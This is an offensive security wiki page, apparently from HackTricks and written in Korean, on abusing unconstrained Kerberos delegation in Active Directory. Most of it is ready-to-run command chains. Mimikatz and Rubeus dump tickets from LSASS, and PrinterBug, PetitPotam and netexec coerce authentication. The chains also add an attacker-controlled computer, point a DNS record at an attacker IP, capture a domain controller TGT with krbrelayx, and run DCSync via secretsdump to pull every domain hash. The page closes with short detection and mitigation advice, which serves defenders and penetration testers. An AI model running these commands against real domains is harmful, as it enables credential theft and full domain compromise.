# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

이것은 Domain Administrator가 도메인 내부의 어떤 **Computer**에도 설정할 수 있는 기능이다. 그러면 **user logins**가 그 Computer에 할 때마다, 해당 사용자의 **TGT 복사본**이 DC가 제공한 **TGS 안으로 전송**되고 **LSASS의 메모리에 저장**된다. 따라서 해당 머신에서 Administrator 권한이 있으면, **티켓을 덤프하고 사용자로 위장**할 수 있으며 어떤 머신에서든 가능하다.

즉, domain admin이 "Unconstrained Delegation" 기능이 활성화된 Computer에 로그인하고, 당신이 그 머신에서 local admin 권한을 가지고 있다면, 티켓을 덤프해서 어디서든 Domain Admin으로 위장할 수 있다(domain privesc).

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 속성을 포함하는지 [userAccountControl](<https://msdn.microsoft.com/en-us/library/en-us/library/ms680832(v=vs.85).aspx>) 속성을 확인하여 이 속성을 가진 Computer objects를 **찾을 수 있다**. 이것은 LDAP filter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’로 할 수 있으며, powerview가 하는 방식이다:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Administrator(또는 피해자 사용자)의 티켓을 메모리에 **Mimikatz** 또는 **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
추가 정보: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.team의 Unconstrained delegation에 대한 추가 정보.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

공격자가 **"Unconstrained Delegation"이 허용된 컴퓨터를 침해**할 수 있다면, **Print server**를 **속여** 해당 시스템에 **자동으로 로그인**하게 만들 수 있고, 그 결과 서버 메모리에 **TGT**가 저장된다.\
그런 다음 공격자는 **Pass the Ticket 공격**을 수행하여 **Print server 컴퓨터 계정**으로 **사칭**할 수 있다.

아무 컴퓨터에나 print server가 로그인하도록 하려면 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)을 사용할 수 있다:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
TGT가 domain controller에서 온 경우, [**DCSync attack**](acl-persistence-abuse/index.html#dcsync)을 수행하여 DC의 모든 hash를 얻을 수 있습니다.\
[**이 공격에 대한 더 많은 정보는 ired.team에서 확인하세요.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

다음은 **authentication을 강제하는** 다른 방법들입니다:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

피해자가 **Kerberos**로 당신의 unconstrained-delegation host에 authentication하도록 만드는 다른 coercion primitive도 모두 동작합니다. 현대 환경에서는 이는 종종 classic PrinterBug flow를 **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, 또는 **WebClient/WebDAV** 기반 coercion으로 대체하는 것을 의미하며, 어떤 RPC surface가 reachable한지에 따라 달라집니다.

### unconstrained delegation이 있는 user/service account abuse

Unconstrained delegation은 **computer objects**에만 제한되지 않습니다. **user/service account**도 `TRUSTED_FOR_DELEGATION`으로 설정될 수 있습니다. 이 경우 실질적인 요구사항은 해당 account가 자신이 소유한 **SPN**에 대한 Kerberos service tickets를 받아야 한다는 것입니다.

이로 인해 매우 흔한 offensive 경로 2가지가 생깁니다:

1. unconstrained-delegation **user account**의 password/hash를 compromise한 뒤, 같은 account에 **SPN**을 추가합니다.
2. account에 이미 하나 이상의 SPN이 있지만, 그중 하나가 **오래되었거나 decommission된 hostname**을 가리키는 경우입니다. 누락된 **DNS A record**를 다시 만들기만 해도 SPN set을 수정하지 않고 authentication flow를 hijack할 수 있습니다.

최소 Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes:

- 이는 unconstrained principal이 **service account**이고, joined host에서 code execution이 아니라 그 credentials만 가지고 있을 때 특히 유용하다.
- target user에 이미 **stale SPN**이 있다면, 대응하는 **DNS record**를 다시 만드는 것이 AD에 새 SPN을 쓰는 것보다 덜 noisy할 수 있다.
- 최근 Linux-centric tradecraft는 `addspn.py`, `dnstool.py`, `krbrelayx.py`, 그리고 하나의 coercion primitive를 사용한다. 이 chain을 완료하기 위해 Windows host를 건드릴 필요는 없다.

### attacker-created computer를 이용한 Unconstrained Delegation 악용

Modern domains는 종종 `MachineAccountQuota > 0`(default 10)을 가지고 있어, 인증된 principal이라면 누구나 최대 N개의 computer objects를 생성할 수 있다. 또한 `SeEnableDelegationPrivilege` token privilege(또는 동등한 권한)를 가지고 있다면, 새로 만든 computer를 unconstrained delegation에 대해 trusted하도록 설정하고 privileged systems에서 inbound TGTs를 수집할 수 있다.

High-level flow:

1) 제어할 수 있는 computer를 생성한다
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) 도메인 내부에서 fake hostname이 resolvable하도록 만들기
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) 공격자가 제어하는 컴퓨터에서 Unconstrained Delegation 활성화
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
왜 이것이 동작하는가: unconstrained delegation에서는 delegation-enabled 컴퓨터의 LSA가 들어오는 TGT를 캐시합니다. DC나 privileged server를 속여 가짜 host로 인증하게 만들면, 해당 machine TGT가 저장되고 export할 수 있습니다.

4) krbrelayx를 export 모드로 시작하고 Kerberos material을 준비합니다
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) DC/서버에서 인증을 강제로 유도하여 가짜 호스트로 보내기
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx는 머신이 인증할 때 ccache 파일을 저장합니다. 예를 들어:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) 캡처한 DC machine TGT를 사용하여 DCSync를 수행합니다
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notes and requirements:

- `MachineAccountQuota > 0`는 비권한 사용자의 computer 생성을 허용하며, 그렇지 않으면 명시적 권한이 필요합니다.
- computer에 `TRUSTED_FOR_DELEGATION`을 설정하려면 `SeEnableDelegationPrivilege`(또는 domain admin)가 필요합니다.
- DC가 FQDN으로 fake host에 도달할 수 있도록 이름 해석(DNS A record)을 보장하세요.
- coercion에는 유효한 vector가 필요합니다(PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, 등). 가능하면 DC에서 이를 비활성화하세요.
- 피해자 account가 **"Account is sensitive and cannot be delegated"**로 표시되어 있거나 **Protected Users**의 멤버인 경우, forwarded TGT는 service ticket에 포함되지 않으므로 이 chain으로 reusable TGT를 얻을 수 없습니다.
- 인증하는 client/server에서 **Credential Guard**가 활성화되어 있으면, Windows는 **Kerberos unconstrained delegation**을 차단하므로, 운영자 관점에서는 유효해 보이는 coercion path도 실패할 수 있습니다.

Detection and hardening ideas:

- UAC `TRUSTED_FOR_DELEGATION`이 설정될 때 Event ID 4741(computer account created) 및 4742/4738(computer/user account changed)를 alert 하세요.
- domain zone의 비정상적인 DNS A-record 추가를 모니터링하세요.
- 예상치 못한 host에서의 4768/4769 급증과 DC-authentications to non-DC hosts를 주시하세요.
- `SeEnableDelegationPrivilege`를 최소한의 set으로 제한하고, 가능하다면 `MachineAccountQuota=0`으로 설정하며, DC에서 Print Spooler를 비활성화하세요. LDAP signing과 channel binding을 적용하세요.

### Mitigation

- DA/Admin logins를 특정 service로만 제한
- privileged account에 대해 "Account is sensitive and cannot be delegated" 설정

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
